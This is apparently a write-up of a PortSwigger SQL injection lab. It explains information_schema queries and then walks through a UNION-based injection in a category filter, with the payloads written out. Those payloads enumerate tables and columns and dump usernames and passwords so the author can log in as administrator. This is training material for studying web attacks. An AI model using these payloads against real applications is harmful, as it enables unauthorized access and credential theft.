## Listing the contents of the database

Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.

You can query `information_schema.tables` to list the tables in the database:

`SELECT * FROM information_schema.tables`

This returns output like the following:

```bash
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE 
===================================================== 
MyDatabase dbo Products BASE TABLE 
MyDatabase dbo Users BASE TABLE 
MyDatabase dbo Feedback BASE TABLE
```

This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to list the columns in individual tables:

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

This returns output like the following:

```bash
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
================================================================= 
MyDatabase dbo Users UserId int 
MyDatabase dbo Users Username varchar 
MyDatabase dbo Users Password varchar
```

This output shows the columns in the specified table and the data type of each column.

# Lab: SQL injection attack, listing the database contents on non-Oracle databases

This lab contains an  [SQL injection](https://portswigger.net/web-security/sql-injection)  vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the  `administrator`  user.

# PoC

1.  Use Burp Suite to intercept and modify the request that sets the product category filter.
2.  Determine the  [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)  and  [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the  `category`  parameter:
    
    - `' ORDER BY 2--`
    - `' ORDER BY 2--`
	- `' UNION SELECT 'test', 'test'--`
	- `' UNION SELECT version(), NULL--`
	
	from the version, we know the database version is using PostgreSQL
3.  Use the following payload to retrieve the list of tables in the database:
    
    `' UNION SELECT NULL, table_name FROM information_schema.tables--`
4.  Find the name of the table containing user credentials.
5.  Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
    
    `' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'users_xtipdx'--`
6.  Find the names of the columns containing usernames and passwords.
7.  Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
    
    `' UNION SELECT username_qvmofd, password_ulzbnu FROM users_xtipdx--`
8.  Find the password for the  `administrator`  user, and use it to log in.
